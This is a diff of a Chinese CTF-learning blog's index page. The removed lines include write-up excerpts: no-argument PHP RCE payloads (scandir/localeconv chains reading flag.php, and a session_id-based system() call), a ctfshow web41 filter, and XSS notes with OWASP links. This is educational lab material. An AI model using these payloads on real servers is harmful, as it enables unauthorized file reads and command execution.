-<h3 id="3-4-scandir"><a href="#3-4-scandir" class="headerlink" title="3.4 scandir()"></a>3.4 scandir()</h3><p>列出目录中的文件和目录 。</p>
-<h3 id="3-5-next"><a href="#3-5-next" class="headerlink" title="3.5 next()"></a>3.5 next()</h3><p>该函数将内部指针指向数组中的下一个元素并输出。</p>
-<h3 id="3-6-end"><a href="#3-6-end" class="headerlink" title="3.6 end()"></a>3.6 end()</h3><p>取数组的最后一项，数组指针指向下一位。</p>
-<h3 id="3-7-array-reverse"><a href="#3-7-array-reverse" class="headerlink" title="3.7 array_reverse()"></a>3.7 array_reverse()</h3><p>以相反的元素返回数组，将数组颠倒。</p>
-<h3 id="3-8-array-rand"><a href="#3-8-array-rand" class="headerlink" title="3.8 array_rand()"></a>3.8 array_rand()</h3><p>随机返回数组的键名。</p>
-<h3 id="3-9-array-flip"><a href="#3-9-array-flip" class="headerlink" title="3.9 array_flip()"></a>3.9 array_flip()</h3><p>交换数组的键和值。</p>
-<h3 id="3-10-highlight-file"><a href="#3-10-highlight-file" class="headerlink" title="3.10 highlight_file()"></a>3.10 highlight_file()</h3><p>打印输出或者返回filename文件中语法高亮版本的代码。</p>
-<p>3.11 pos()</p>
-<p>返回数组中的当前元素的值</p>
-<p>所以禁止套娃这一题的payload如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(pos(localeconv())));   //查看当前目录文件下的存在的数组</span><br></pre></td></tr></table></figure>
-
-<p>分析一下这个payload：</p>
-<p>1）localeconv返回一个包含本地数字及货币格式信息的数组。<img src="/../images/1651227195953.png" alt="1651227195953"></p>
-<p>第一个就是点！！</p>
-<p>然后pos函数取得数组的值<img src="/../images/1651227244289.png" alt="1651227244289"></p>
-<p>发现了吧，最终scandir函数的参数是点，点代表的就是当前目录，所以scandir列出了当前目录下的文件和目录！</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
-
-<p>将数组颠倒，这样flag.php位于数组第二个位置，然后next函数之后指针指向了flag.php所在位置，最后直接读文件！</p>
-<p>这样也可以</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure>
-
-<p>但是第一个payload在ctfshow这题居然不行，第二个才可以。但是为什么报同样的警告一个可以执行一个不行？</p>
-<p>上面的太麻烦了，还有更简单的。通过php的session_id(session_start())</p>
-<p>这道题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。使用session之前需要通过session_start()告诉PHP使用session，php默认的是不主动使用session的，session_id()可以获取当前的session_id。</p>
-<p>所以我们手动设置名为PHPSESSID的cookie，并设置为flag.php。</p>
-<p><img src="/../images/1651227949187.png" alt="1651227949187"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">session_id</span>()));</span><br></pre></td></tr></table></figure>
-
-<p>传入session_id&#x3D;ls，所以执行system(‘ls’) 。</p>
-<p>总结：无参数RCE &#x3D;&gt; 寻找无参数函数作为有参数函数的参数 或者 通过php的sessionid</p>
-<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>code：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>字母数字都没了。已经蚌埠住了….</p>
-<p>果断看提示: 发现是或运算符。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/28/XSS-WEBGOAT/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MirRoR4s">
-      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/28/XSS-WEBGOAT/" class="post-title-link" itemprop="url">XSS_WEBGOAT</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-28 16:32:46" itemprop="dateCreated datePublished" datetime="2022-04-28T16:32:46+08:00">2022-04-28</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/28/XSS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MirRoR4s">
-      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/28/XSS/" class="post-title-link" itemprop="url">XSS</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-28 12:10:44 / 修改时间：12:16:13" itemprop="dateCreated datePublished" datetime="2022-04-28T12:10:44+08:00">2022-04-28</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="0x01-XSS定义"><a href="#0x01-XSS定义" class="headerlink" title="0x01 XSS定义"></a>0x01 XSS定义</h2><p>直接上OWSAP的定义<a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></p>
-<p>人工翻译🤭</p>
-<p>跨站脚本攻击是一种注入，其中恶意脚本被注入到其他良性和受信任的网站中。XSS攻击发生在攻击者使用WEB应用程序发送恶意代码时，通常是以浏览器端脚本的形式发送给别人。XSS常发生在没有对用户的输入进行验证或者编码就对用户的输入进行了输出的地方。</p>
-<p>一个攻击者可以使用XSS发送一个恶意脚本给用户，但是用户的浏览器无法分辨此脚本是否是值得信任的，从而会执行攻击者发送的恶意脚本。因为浏览器认为脚本来自于一个受信任的源，从而恶意脚本可以访问任何cookies,session tokens 或者是其他保存在浏览器当前网站中的敏感信息。这些脚本甚至可以修改网页的内容。</p>
-<h2 id="0x02-如何避免跨站脚本漏洞"><a href="#0x02-如何避免跨站脚本漏洞" class="headerlink" title="0x02 如何避免跨站脚本漏洞"></a>0x02 如何避免跨站脚本漏洞</h2><ol>
-<li><p>XSS (Cross Site Scripting) Prevention Cheat Sheet :<a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></p>
-<p>2.DOM based XSS Prevention Cheat Sheet: <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</a></p>
-<p>3.OWASP Development Guide article on Data Validation: <a target="_blank" rel="noopener" href="https://wiki.owasp.org/index.php/Data_Validation">https://wiki.owasp.org/index.php/Data_Validation</a></p>
-</li>
-</ol>
-<p>​    4.OWASP Development Guide article on Phishing:  <a target="_blank" rel="noopener" href="https://wiki.owasp.org/index.php/Phishing">https://wiki.owasp.org/index.php/Phishing</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/28/DVWA-XSS-Reflected/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MirRoR4s">
-      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/28/DVWA-XSS-Reflected/" class="post-title-link" itemprop="url">DVWA_XSS(Reflected)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-28 11:32:18 / 修改时间：16:17:42" itemprop="dateCreated datePublished" datetime="2022-04-28T11:32:18+08:00">2022-04-28</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>从MRCTF的那道XSS之后感觉对XSS的实战太陌生了，回来靶场练基本功，先从dvwa开始吧。网上的答案什么的全是测一下能否弹窗然后就结束了，太简单了，这一次练习必须所有题目都可以偷到cookie！
+          <p>CTFSHOW
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2022/04/28/DVWA-XSS-Reflected/#more" rel="contents">
+              <a class="btn" href="/2022/04/29/CTFSHOW-web32%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -708,7 +560,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -774,7 +626,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">18</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -787,7 +639,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -873,6 +725,8 @@
 
 
 
+
+  
 
   
 
